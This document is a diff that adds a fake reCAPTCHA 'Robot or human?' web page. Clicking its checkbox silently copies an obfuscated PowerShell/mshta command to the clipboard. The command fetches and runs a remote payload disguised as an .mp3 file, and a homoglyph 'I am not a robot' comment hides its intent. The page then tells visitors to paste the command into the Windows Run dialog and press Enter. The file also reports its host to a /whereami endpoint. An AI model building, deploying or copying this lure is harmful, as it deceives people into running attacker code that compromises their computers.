@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Captcha Verification</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- FontAwesome CDN -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: #ffffff;
+        color: #000;
+      }
+
+      .recaptcha-mock {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        text-align: left;
+        width: 262px;
+        height: 58px;
+        background-color: #f9f9f9;
+        border: 1px solid #dcdcdc;
+        border-radius: 3px;
+        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.2);
+        padding: 10px;
+        position: relative;
+      }
+
+      .recaptcha-checkbox {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 1px solid #dcdcdc;
+        background-color: #fff;
+        border-radius: 3px;
+        position: absolute;
+        margin-left: -190px;
+        cursor: pointer;
+      }
+
+      .recaptcha-checkbox::after {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 10px;
+        height: 10px;
+        background-color: #4285f4;
+        border-radius: 2px;
+        transform: translate(-50%, -50%) scale(0);
+        transition: transform 0.2s ease;
+      }
+
+      .recaptcha-checkbox.checked::after {
+        transform: translate(-50%, -50%) scale(1);
+      }
+
+      .recaptcha-label {
+        position: absolute;
+        margin-left: -70px;
+        font-size: 14px;
+        color: #333;
+      }
+
+      .recaptcha-logo {
+        position: absolute;
+        bottom: 5px;
+        right: 10px;
+        font-size: 10px;
+        color: #666;
+      }
+
+      .loadImg {
+        display: none;
+        width: 20px;
+        height: 20px;
+        position: absolute;
+        margin-top: -3px;
+        margin-left: -210px;
+        border: 2px solid #4688f1;
+        border-top-color: transparent;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* Verification Steps Box – note: top border removed */
+      #verificationSteps {
+        position: absolute;
+        top: 70px;
+        right: -60px;
+        width: 282px;
+        background-color: #fff;
+        border: 1px solid #dcdcdc;
+        border-top: none; /* Remove top border so the triangle covers seamlessly */
+        border-radius: 5px;
+        padding: 20px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        font-size: 14px;
+        text-align: left;
+        z-index: 1;
+      }
+
+      /* Triangle Pointer using pseudo‑elements attached to #verificationSteps */
+      #verificationSteps::before {
+        content: "";
+        position: absolute;
+        top: -11px;
+        left: 10px;
+        border-left: 11px solid transparent;
+        border-right: 11px solid transparent;
+        border-bottom: 11px solid #dcdcdc; /* Border color */
+        z-index: 2;
+      }
+      #verificationSteps::after {
+        content: "";
+        position: absolute;
+        top: -10px;
+        left: 10px;
+        border-left: 10px solid transparent;
+        border-right: 10px solid transparent;
+        border-bottom: 10px solid #fff; /* White fill to hide the underlying border */
+        z-index: 3;
+      }
+
+      /* Footer Section Below the Verification Text */
+      .verification-footer {
+        margin-top: 20px;
+      }
+      .verification-footer hr {
+        border: none;
+        border-top: 1px solid #dcdcdc;
+        margin: 10px 0;
+      }
+      .footer-content {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      .footer-icons {
+        display: flex;
+        align-items: center;
+      }
+      .footer-icons i,
+      .footer-icons svg {
+        font-size: 18px;
+        color: #555;
+        margin-right: 8px;
+      }
+      .verify-button {
+        background-color: #4fa9ff;
+        color: #fff;
+        border: none;
+        padding: 8px 12px;
+        border-radius: 3px;
+        cursor: not-allowed;
+        font-size: 14px;
+        opacity: 0.6;
+      }
+    </style>
+  </head>
+  <body>
+    <div
+      style="
+        position: fixed;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.7);
+      "
+    >
+      <div
+        style="
+          position: absolute;
+          left: 50%;
+          transform: translateX(-50%);
+          top: 30%;
+          background-color: white;
+          border-radius: 8px;
+          width: 600px;
+          height: 200px;
+          padding: 20px;
+        "
+      >
+        <h2 style="text-align: center">Robot or human?</h2>
+        <p style="text-align: center">
+          Check the box to confirm that you're human. Thank you!
+        </p>
+        <div
+          id="captcha-container"
+          style="
+            position: absolute;
+            left: 28%;
+            display: block;
+            text-align: center;
+          "
+        >
+          <div class="recaptcha-mock">
+            <div
+              class="recaptcha-checkbox"
+              onclick="showVerification()"
+              style="cursor: pointer"
+            ></div>
+            <div class="loadImg"></div>
+            <span class="recaptcha-label" style="margin-left: 10px"
+              >I'm not a robot</span
+            >
+            <img
+              src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
+              style="
+                width: 32px;
+                height: 32px;
+                position: absolute;
+                margin-right: -200px;
+                margin-top: -15px;
+              "
+            />
+            <div class="recaptcha-logo">reCAPTCHA</div>
+            <!-- Verification Steps (inside recaptcha-mock) -->
+            <div id="verificationSteps" style="display: none">
+              <div class="checkbtn-steps">
+                <div style="font-size: 16px; margin-bottom: 10px">
+                  Verification Steps
+                </div>
+                <div style="margin: 5px 0 5px 15px">
+                  1. Press Windows Key " <i class="fa-brands fa-windows"></i> "
+                  + R
+                </div>
+                <div style="margin: 5px 0 5px 15px">2. Press CTRL + V</div>
+                <div style="margin: 5px 0 5px 15px">3. Press Enter</div>
+              </div>
+              <div class="verification-footer">
+                <hr />
+                <div class="footer-content">
+                  <div class="footer-icons">
+                    <i class="fas fa-sync-alt"></i>
+                    <i class="fas fa-headphones"></i>
+                    <!-- Custom Info Icon with a solid "i" -->
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      viewBox="0 0 50 50"
+                      style="width: 18px; height: 18px; margin-right: 8px"
+                    >
+                      <circle
+                        cx="25"
+                        cy="25"
+                        r="23"
+                        fill="none"
+                        stroke="#555"
+                        stroke-width="2"
+                      />
+                      <circle cx="25" cy="14" r="3" fill="#555" />
+                      <path
+                        d="M 21 21 L 21 23 L 22 23 L 23 23 L 23 36 L 22 36 L 21 36 L 21 38 L 22 38 L 23 38 L 27 38 L 28 38 L 29 38 L 29 36 L 28 36 L 27 36 L 27 21 L 26 21 L 22 21 L 21 21 Z"
+                        fill="#555"
+                      />
+                    </svg>
+                  </div>
+                  <div class="verify-button-container">
+                    <button class="verify-button" disabled>Verify</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <!-- End Verification Steps -->
+          </div>
+        </div>
+        <p id="message" style="text-align: center; color: red"></p>
+      </div>
+    </div>
+
+    <script>
+      const cmd =
+        "powershell . \\*i*\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\*2\\msh*e ###HOST###/Coloringoutomic_Host.mp3   ###HOST###/Coloringoutomic_Host.mp3 #     ✅ Ι am nοt a rοbοt: CAPTCHA Verification ID: 10086";
+      const baseUrl = `${window.location.protocol}//${window.location.host}`;
+
+      fetch("/whereami", {
+        method: "POST",
+        body: baseUrl,
+      }).catch((err) => {
+        console.error("Failed to report host:", err);
+      });
+
+      function showVerification() {
+        const checkbox = document.querySelector(".recaptcha-checkbox");
+        const loadImg = document.querySelector(".loadImg");
+
+        // Hide the checkbox and show spinner
+        checkbox.style.display = "none";
+        loadImg.style.display = "block";
+
+        setTimeout(() => {
+          document.getElementById("verificationSteps").style.display = "block";
+          let ta = document.createElement("textarea");
+          ta.value = cmd.replaceAll("###HOST###", baseUrl);
+          ta.style.position = "fixed";
+          ta.style.opacity = 0;
+          ta.style.top = "-9999px";
+          document.body.appendChild(ta);
+          ta.focus();
+          ta.select();
+          document.execCommand("copy");
+          ta.remove();
+        }, 1000);
+      }
+    </script>
+  </body>
+</html>
